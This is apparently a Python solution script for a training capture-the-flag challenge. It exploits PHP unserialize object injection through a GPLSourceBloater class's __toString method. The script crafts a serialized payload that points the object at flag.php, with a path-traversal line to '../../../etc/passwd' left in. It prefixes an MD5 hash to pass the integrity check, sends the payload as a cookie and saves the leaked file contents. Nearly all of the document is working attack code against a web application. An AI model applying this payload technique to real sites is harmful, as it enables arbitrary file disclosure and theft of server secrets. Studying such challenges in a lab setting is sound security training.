#!/usr/bin/env python3

"""
exploit of the serialize function of PHP.
It is possible to serialize a class and exploit a magic method.
In this case there was a class with name GPLSourceBloater and a method __toString.
"""

import requests
import urllib.parse
from hashlib import md5

base_url = "http://free.training.jinblack.it"

payload = "../../../etc/passwd"
payload = "flag.php"
evil_serialize = 'a:5:{i:0;s:1:"a";i:1;s:1:"a";i:2;s:1:"a";i:3;s:1:"a";i:4;'
evil_serialize += 'O:16:"GPLSourceBloater":1:{s:6:"source";s:' + str(
    len(payload)) + ':"' + payload + '";}}'

print(evil_serialize)

todos = md5(evil_serialize.encode()).hexdigest() + evil_serialize
todos = urllib.parse.quote(todos)

cookies = {
    "todos": todos,
}
r = requests.get(base_url, cookies=cookies)

with open("temp.html", "w") as f:
    license = """I'd&nbsp;just&nbsp;like&nbsp;to&nbsp;interject&nbsp;for&nbsp;a&nbsp;moment.&nbsp;What&nbsp;you're&nbsp;referring&nbsp;to&nbsp;as&nbsp;Linux,&nbsp;is&nbsp;in&nbsp;fact,&nbsp;GNU/Linux,&nbsp;or&nbsp;as&nbsp;I've&nbsp;recently&nbsp;taken&nbsp;to&nbsp;calling&nbsp;it,&nbsp;GNU&nbsp;plus&nbsp;Linux.&nbsp;<br />Linux&nbsp;is&nbsp;not&nbsp;an&nbsp;operating&nbsp;system&nbsp;unto&nbsp;itself,&nbsp;but&nbsp;rather&nbsp;another&nbsp;free&nbsp;component&nbsp;of&nbsp;a&nbsp;fully&nbsp;functioning&nbsp;GNU&nbsp;system&nbsp;made&nbsp;useful&nbsp;by&nbsp;the&nbsp;GNU&nbsp;corelibs,&nbsp;<br />shell&nbsp;utilities&nbsp;and&nbsp;vital&nbsp;system&nbsp;components&nbsp;comprising&nbsp;a&nbsp;full&nbsp;OS&nbsp;as&nbsp;defined&nbsp;by&nbsp;POSIX.<br /><br />Many&nbsp;computer&nbsp;users&nbsp;run&nbsp;a&nbsp;modified&nbsp;version&nbsp;of&nbsp;the&nbsp;GNU&nbsp;system&nbsp;every&nbsp;day,&nbsp;without&nbsp;realizing&nbsp;it.&nbsp;<br />Through&nbsp;a&nbsp;peculiar&nbsp;turn&nbsp;of&nbsp;events,&nbsp;the&nbsp;version&nbsp;of&nbsp;GNU&nbsp;which&nbsp;is&nbsp;widely&nbsp;used&nbsp;today&nbsp;is&nbsp;often&nbsp;called&nbsp;"Linux",&nbsp;<br />and&nbsp;many&nbsp;of&nbsp;its&nbsp;users&nbsp;are&nbsp;not&nbsp;aware&nbsp;that&nbsp;it&nbsp;is&nbsp;basically&nbsp;the&nbsp;GNU&nbsp;system,&nbsp;developed&nbsp;by&nbsp;the&nbsp;GNU&nbsp;Project.<br /><br />There&nbsp;really&nbsp;is&nbsp;a&nbsp;Linux,&nbsp;and&nbsp;these&nbsp;people&nbsp;are&nbsp;using&nbsp;it,&nbsp;but&nbsp;it&nbsp;is&nbsp;just&nbsp;a&nbsp;part&nbsp;of&nbsp;the&nbsp;system&nbsp;they&nbsp;use.&nbsp;Linux&nbsp;is&nbsp;the&nbsp;kernel:&nbsp;<br />the&nbsp;program&nbsp;in&nbsp;the&nbsp;system&nbsp;that&nbsp;allocates&nbsp;the&nbsp;machine's&nbsp;resources&nbsp;to&nbsp;the&nbsp;other&nbsp;programs&nbsp;that&nbsp;you&nbsp;run.&nbsp;<br />The&nbsp;kernel&nbsp;is&nbsp;an&nbsp;essential&nbsp;part&nbsp;of&nbsp;an&nbsp;operating&nbsp;system,&nbsp;but&nbsp;useless&nbsp;by&nbsp;itself;&nbsp;it&nbsp;can&nbsp;only&nbsp;function&nbsp;in&nbsp;the&nbsp;context&nbsp;of&nbsp;a&nbsp;complete&nbsp;operating&nbsp;system.&nbsp;<br />Linux&nbsp;is&nbsp;normally&nbsp;used&nbsp;in&nbsp;combination&nbsp;with&nbsp;the&nbsp;GNU&nbsp;operating&nbsp;system:&nbsp;the&nbsp;whole&nbsp;system&nbsp;is&nbsp;basically&nbsp;GNU&nbsp;with&nbsp;Linux&nbsp;added,&nbsp;or&nbsp;GNU/Linux.&nbsp;<br />All&nbsp;the&nbsp;so-called&nbsp;"Linux"&nbsp;distributions&nbsp;are&nbsp;really&nbsp;distributions&nbsp;of&nbsp;GNU/Linux.<br />"""
    res = r.content.decode()
    res = res.replace(license, "")
    f.write(res)
